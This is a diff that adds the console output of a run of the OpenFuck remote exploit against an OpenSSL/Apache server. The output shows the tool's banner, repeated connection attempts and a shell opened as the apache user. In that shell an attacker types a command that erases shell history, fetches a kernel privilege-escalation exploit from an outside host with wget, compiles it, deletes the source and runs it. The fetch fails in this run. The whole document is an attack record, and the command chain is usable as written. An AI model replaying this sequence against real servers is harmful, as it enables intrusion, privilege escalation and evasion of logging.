@@ -1,0 +1,33 @@
+
+*******************************************************************
+* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 1 of 40Connection... 2 of 40Connection... 3 of 40Connection... 4 of 40Connection... 5 of 40Connection... 6 of 40Connection... 7 of 40Connection... 8 of 40Connection... 9 of 40Connection... 10 of 40Connection... 11 of 40Connection... 12 of 40Connection... 13 of 40Connection... 14 of 40Connection... 15 of 40Connection... 16 of 40Connection... 17 of 40Connection... 18 of 40Connection... 19 of 40Connection... 20 of 40Connection... 21 of 40Connection... 22 of 40Connection... 23 of 40Connection... 24 of 40Connection... 25 of 40Connection... 26 of 40Connection... 27 of 40Connection... 28 of 40Connection... 29 of 40Connection... 30 of 40Connection... 31 of 40Connection... 32 of 40Connection... 33 of 40Connection... 34 of 40Connection... 35 of 40Connection... 36 of 40Connection... 37 of 40Connection... 38 of 40Connection... 39 of 40Connection... 40 of 40
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8050
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$ 
+bash-2.05$ unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304 -exploits/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo d.c; ./exploit; 
+--00:17:07--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:443... 
+dl.packetstormsecurity.net: Host not found.
+gcc: ptrace-kmod.c: No such file or directory
+gcc: No input files
+rm: cannot remove `ptrace-kmod.c': No such file or directory
+bash: ./exploit: No such file or directory
+bash-2.05$ 
+bash-2.05$ id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-2.05$ exit
+exit
+Good Bye!
